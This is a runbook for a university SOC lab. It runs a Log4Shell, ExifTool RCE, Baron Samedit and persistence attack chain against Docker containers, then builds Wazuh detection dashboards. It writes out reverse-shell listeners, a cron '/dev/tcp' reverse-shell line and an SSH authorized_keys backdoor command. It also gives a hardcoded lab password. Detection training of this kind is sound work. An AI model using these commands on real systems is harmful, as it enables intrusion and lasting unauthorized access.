# Pipeline SOC Runbook

Step-by-step instructions for running the full attack chain and setting up Wazuh dashboards.

---

## 0. Pre-flight Checklist

Before starting, confirm all containers are up and ready:

```bash
cd /home/mate/Uni/soc
docker compose ps
```

All 6 containers should show `Up`:
- attacker
- solr
- gitlab (may show `health: starting` for 2-3 minutes on cold start)
- wazuh-manager
- wazuh-indexer
- wazuh-dashboard

Verify endpoints respond:

```bash
curl -s -o /dev/null -w "Solr:      %{http_code}\n" http://localhost:8983/solr/admin/cores
curl -s -o /dev/null -w "GitLab:    %{http_code}\n" http://localhost:8080/users/sign_in
curl -sk -o /dev/null -w "Dashboard: %{http_code}\n" https://localhost:443/
TOKEN=$(curl -sk -u wazuh-wui:MyS3cr3tP@ss -X POST "https://localhost:55000/security/user/authenticate?raw=true")
curl -sk -H "Authorization: Bearer $TOKEN" -o /dev/null -w "Manager:   %{http_code}\n" "https://localhost:55000/"
```

Expected: all return 200 or 302. If GitLab is still 502, wait 2 minutes and retry.

Verify Wazuh agents are registered (reuses `$TOKEN` from above):

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "https://localhost:55000/agents?pretty" | grep -E '"name"|"status"'
```

Expected: 3 agents — `wazuh-manager`, `solr`, `gitlab` — all with `"status": "active"`.

---

## 1. Log4Shell Attack (Phase 1: Initial Access)

**Target:** Solr 8.11.0 at `172.26.0.20:8983`
**CVE:** CVE-2021-44228
**Callback port:** 4444

### Run

You need **two terminals** — one for the reverse shell listener, one for the exploit.

**Terminal 1 (listener):**

```bash
docker exec -it attacker nc -lvnp 4444
```

Keep this open. It waits for the reverse shell.

**Terminal 2 (exploit):**

```bash
docker exec -it attacker /opt/scripts/01-log4shell.sh
```

Expected output:
```
[1/4] Compiling Evil.java...
[2/4] Starting HTTP server on port 8888...
[3/4] Starting LDAP redirect server on port 1389...
[4/4] Sending JNDI payload to Solr...
```

### Verify Success

Within ~5 seconds, Terminal 1 should show a shell prompt like:
```
Connection received on 172.26.0.20
bash: cannot set terminal process group...
solr@abc123:/opt/solr-8.11.0/server$
```

You now have a reverse shell as the `solr` user.

### Verify Detection

Open https://localhost:443 → login `wazuh-wui` / `MyS3cr3tP@ss`
Navigate to **Security events** → filter by `rule.id: 100100`
You should see **"Log4Shell exploitation attempt: JNDI lookup pattern detected"** alerts.

### Cleanup Before Next Step

In Terminal 2, press `Ctrl+C` to stop the LDAP and HTTP servers.
Leave Terminal 1's reverse shell open — you may need it, or close it and proceed.

---

## 2. ExifTool RCE Attack (Phase 2: Execution)

**Target:** GitLab 13.10.2 at `172.26.0.30:80`
**CVE:** CVE-2021-22205
**Callback port:** 4445

### Run

**Terminal 1 (listener):**

```bash
docker exec -it attacker nc -lvnp 4445
```

**Terminal 2 (exploit):**

```bash
docker exec -it attacker /opt/scripts/02-exiftool-rce.sh
```

Expected output:
```
[1/2] Generating malicious DjVu payload image...
[+] Payload image written to /tmp/exploit.jpg (...)
[2/2] Uploading payload to GitLab...
      HTTP Response: 200 or 422
```

### Verify Success

Terminal 1 should receive a connection:
```
Connection received on 172.26.0.30
git@abc123:/$
```

You now have a reverse shell as the `git` user on the GitLab container.

### Verify Detection

In Wazuh Dashboard, filter by `rule.id: 100200 or rule.id: 100201 or rule.id: 100202`.
You should see **"ExifTool spawning shell"** or **"DjVu file processing"** alerts.

**Keep this `git` user shell open** — you need it for the next step.

---

## 3. Baron Samedit Privilege Escalation (Phase 3)

**Target:** `git` user on GitLab → escalate to `root`
**CVE:** CVE-2021-3156
**Run from:** The reverse shell opened in Phase 2

### Transfer the Exploit

**Terminal 2 (on attacker, get the base64-encoded exploit):**

```bash
docker exec -it attacker /opt/scripts/03-baron-samedit.sh
```

This prints the commands you need to paste into the `git` user shell.
Copy the entire `mkdir -p /tmp/exploit` ... `chmod +x` block.

### Run the Exploit

**Terminal 1 (your `git` user reverse shell):**

Paste the commands you copied. Then:

```bash
# Test if vulnerable (should print "Exit code: 139"):
sudoedit -s '\' 2>/dev/null; echo "Exit code: $?"

# Run the exploit:
cd /tmp/exploit && python3 exploit_nss.py
```

### Verify Success

If successful, you'll see:
```
[+] ROOT shell obtained!
root@gitlab:/#
```

Verify with `id`:
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Note:** The simplified exploit in `exploit_nss.py` is best-effort. If it fails, clone worawit's full PoC:
```bash
# On attacker:
cd /opt/exploits/baron-samedit
git clone https://github.com/worawit/CVE-2021-3156.git worawit
# Then transfer worawit/exploit_nss.py the same way
```

### Verify Detection

In Wazuh Dashboard, filter by `rule.id: 100300 or rule.id: 100301 or rule.id: 100302`.
You should see **"Baron Samedit exploitation attempt"** or **"Sudo/sudoedit crash detected"** alerts.

**Keep this root shell open** — you need it for persistence.

---

## 4. Persistence (Phase 4)

**Target:** Root user on GitLab
**Techniques:** T1098.004 (SSH key) + T1053.003 (Cron)
**Run from:** The root shell from Phase 3

### Get the Persistence Commands

**Terminal 2 (on attacker):**

```bash
docker exec -it attacker /opt/scripts/04-persistence.sh
```

This prints the exact commands with your attacker SSH key baked in.

### Plant Persistence

**Terminal 1 (root shell on GitLab):**

Paste the three commands from the output:

```bash
# 1. Plant SSH key:
mkdir -p /root/.ssh && echo '<your-attacker-key>' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys

# 2. Install cron reverse shell:
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/172.26.0.10/4446 0>&1"' | crontab -

# 3. Verify:
cat /root/.ssh/authorized_keys
crontab -l
```

### Verify SSH Persistence

**Terminal 2 (attacker):**

```bash
docker exec -it attacker ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa root@172.26.0.30
```

You should land in a root shell directly.

### Verify Cron Reverse Shell

**Terminal 3 (listener):**

```bash
docker exec -it attacker nc -lvnp 4446
```

Wait up to 1 minute. The cron job should trigger and open a reverse shell.

### Verify Detection

In Wazuh Dashboard, filter by `rule.id: 100400 or rule.id: 100401 or rule.id: 100402 or rule.id: 100403`.
You should see:
- **"Crontab modification detected"** (100400)
- **"Reverse shell command in cron job"** (100401)
- **"SSH authorized_keys file modified"** (100402)
- **"SSH public key being written to authorized_keys"** (100403)

You should also see FIM alerts for `/root/.ssh/authorized_keys` changes.

---

## 5. Wazuh Dashboard Setup

Open https://localhost:443 → login `wazuh-wui` / `MyS3cr3tP@ss`.

### Create the Index Pattern

1. Menu (☰) → **Stack management** → **Index patterns**
2. Click **Create index pattern**
3. Pattern: `wazuh-alerts-*`
4. Time field: `timestamp`
5. Click **Create**

### Dashboard 1 — Attack Chain Overview

1. Menu (☰) → **Dashboards** → **Create dashboard** → **Create new visualization**
2. Select **Area** or **Vertical Bar**
3. Index: `wazuh-alerts-*`
4. **Metrics:** Y-axis = Count
5. **Buckets:**
   - X-axis: **Date Histogram** on `timestamp`
   - Split series: **Terms** on `rule.groups.keyword`, size 10
6. **Filter:** Add filter → `rule.groups` **is one of** `log4shell, exiftool_rce, baron_samedit, persistence`
7. Save as **"Attack Chain Overview"**

### Dashboard 2 — Log4Shell Detection

1. **Discover** view with `wazuh-alerts-*`
2. Filter: `rule.id` **is one of** `100100, 100101`
3. Columns: `timestamp`, `agent.name`, `rule.description`, `data.srcip`
4. Save as **"Log4Shell Detection"**
5. Add to a dashboard called **"Phase Dashboards"**

Create a **Metric** visualization showing count of matching rules, add to the same dashboard.

### Dashboard 3 — ExifTool RCE Detection

Same pattern as Dashboard 2:
- Filter: `rule.id` **is one of** `100200, 100201, 100202`
- Columns: `timestamp`, `agent.name`, `rule.description`, `full_log`
- Save as **"ExifTool RCE Detection"**

### Dashboard 4 — Privilege Escalation Detection

- Filter: `rule.id` **is one of** `100300, 100301, 100302`
- Columns: `timestamp`, `agent.name`, `rule.description`, `full_log`
- Save as **"Privilege Escalation Detection"**

### Dashboard 5 — Persistence Detection

- Filter: `rule.id` **is one of** `100400, 100401, 100402, 100403`
- Columns: `timestamp`, `agent.name`, `rule.description`, `syscheck.path`
- Save as **"Persistence Detection"**

### Dashboard 6 — Alert Severity Distribution

1. Create **Pie** visualization
2. Metrics: **Slice size** = Count
3. Buckets: **Split slices** → Terms on `rule.level`, size 15
4. Save as **"Alert Severity Distribution"**

### Export Dashboards

1. Menu (☰) → **Stack Management** → **Saved Objects**
2. Select all dashboards and their related visualizations/searches
3. **Export** → save as `wazuh/dashboards/export.ndjson` for reproducibility

---

## 6. Teams Webhook (Optional)

If you have a Teams incoming webhook URL:

1. Edit `.env` and set `TEAMS_WEBHOOK_URL=https://your-org.webhook.office.com/webhookb2/...`
2. Restart wazuh-manager: `docker compose restart wazuh-manager`
3. Alerts with level ≥ 12 will fire Teams notifications automatically

To test the webhook manually:
```bash
docker exec wazuh-manager bash -c 'echo "{\"rule\":{\"level\":15,\"id\":\"99999\",\"description\":\"Test alert\",\"groups\":[\"test\"],\"mitre\":{\"id\":[\"T9999\"]}},\"agent\":{\"name\":\"test\"},\"timestamp\":\"now\"}" > /tmp/test.json && /var/ossec/integrations/custom-teams /tmp/test.json "" "$TEAMS_WEBHOOK_URL"'
```

---

## 7. Reset Between Runs

If you need to replay the attacks cleanly:

```bash
# Stop and remove containers + volumes (resets Wazuh and GitLab state)
docker compose down -v

# Regenerate certs (required after -v)
./wazuh/generate-certs.sh

# Bring everything back up
docker compose up -d

# Wait ~3 minutes for GitLab and Wazuh to re-initialize
```

---

## Troubleshooting

**GitLab returns 502:** Wait longer. Cold start can take 3-5 minutes.

**Wazuh agents don't appear as active:**
```bash
docker exec solr /var/ossec/bin/wazuh-control status
docker exec gitlab /var/ossec/bin/wazuh-control status
# If not running: docker exec <container> /var/ossec/bin/wazuh-control start
```

**No alerts in dashboard:**
```bash
# Check manager is processing events:
docker exec wazuh-manager tail -f /var/ossec/logs/ossec.log
# Check alerts file:
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json
```

**Reverse shell doesn't connect:** Confirm listener is on the correct port and the attacker IP in `.env` matches what you're using (should be `172.26.0.10`).

**Baron Samedit exploit fails:** Use worawit's full PoC — see note at the end of Phase 3.
